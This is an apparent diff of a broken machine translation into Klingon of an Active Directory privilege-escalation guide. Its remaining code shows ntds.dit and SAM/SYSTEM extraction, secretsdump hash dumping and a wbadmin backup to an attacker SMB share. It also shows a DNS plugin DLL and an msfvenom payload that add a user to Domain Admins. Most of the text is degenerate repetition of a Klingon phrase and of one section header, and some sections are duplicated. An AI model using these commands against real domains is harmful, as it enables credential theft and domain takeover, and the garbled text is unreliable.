vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlh
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
-
+3. `SYSTEM` jev `SAM` jup 'ej hash retrieval:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-4. Retrieve all hashes from `NTDS.dit`:
-
+4. `NTDS.dit`-wIj DaH jatlhpu' 'ej DaH jatlhpu' 'e' vItlhutlh.
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
-
-#### Using wbadmin.exe
+#### wbadmin.exe vIq
 
 1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
 2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
-    ```cmd
-    net use X: \\<AttackIP>\sharename /user:smbuser password
-    echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
-    wbadmin get versions
-    echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
-    ```
+```cmd
+net use X: \\<AttackIP>\sharename /user:smbuser password
+echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 
 For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
@@ -171,26 +172,28 @@ For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.
 Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
 
 To list members of the DnsAdmins group, use:
-
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-
 ### Execute arbitrary DLL
 
 Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
 
+### ʼIwʼaʼ DLL
+
+Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
 ```
+
 ```c
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -198,51 +201,590 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
+**Translation:**
 
-Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
-
+DNS qapHa' (yInob) qay'be' vItlhutlh: DLL vItlhutlhlu'be'.
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-For more details on this attack vector, refer to ired.team.
-
 #### Mimilib.dll
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
-
-### WPAD Record for MitM
-DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.
-
-### Event Log Readers
-Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
-
+mimilib.dll vItlhutlhlaHbe'chugh, vItlhutlhlaHbe'chugh 'ej reverse shells vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-
 ## Exchange Windows Permissions
-This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
-
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
